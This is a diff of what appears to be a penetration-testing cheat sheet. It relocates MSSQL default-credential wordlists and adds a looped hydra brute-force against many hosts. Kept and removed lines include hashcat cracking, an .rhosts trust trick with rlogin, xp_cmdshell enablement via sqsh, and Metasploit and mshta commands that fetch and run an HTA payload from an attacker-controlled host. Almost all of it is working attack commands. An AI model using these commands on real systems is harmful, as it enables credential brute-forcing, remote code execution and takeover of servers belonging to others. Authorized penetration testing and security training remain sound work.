@@ -405,12 +405,6 @@ cd \hashcat && hashcat.exe -m 13100 hashes rockyou.txt
 9500	MS Office 2010
 9600	MS Office 2013
 
-[*] Bruteforce
-+---------- Wordlists ----------+
-cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
-cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
-/usr/share/wordlists/rockyou.txt
-
 [*] (21) FTP
 wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp
 curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt
@@ -611,6 +605,10 @@ echo '+ +' > .rhosts; chmod 600 .rhosts
 rlogin $USERNAME@$TARGET
 
 [*] (1433) MSSQL
+cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
+cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
+for host in $(cat hosts); do (hydra -I mssql://$host -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null | grep -vE 'Hydra|DATA|completed' | awk '{printf "\x1b[1;34m%s\x1b[0m ", $1; for(i=2;i<=NF;i++) {if(i%2==1) printf "\x1b[1;32m%s\x1b[0m ", $i; else printf "%s ", $i}; print ""}' &); done
+
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT name FROM sys.databases;"
 
 DB_NAME="staging"
@@ -625,9 +623,6 @@ sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC s
 
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
-
-sqsh -S $TARGET -U sa -P sa -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'mshta http://$MYIP:8080/Qp4ne2qq0oOb.hta';"
-sqsh -S $TARGET -U '$DOM'\\'$USERNAME' -P '$PASSWORD' -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami /all';"
 
 msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
 sessions -i 1
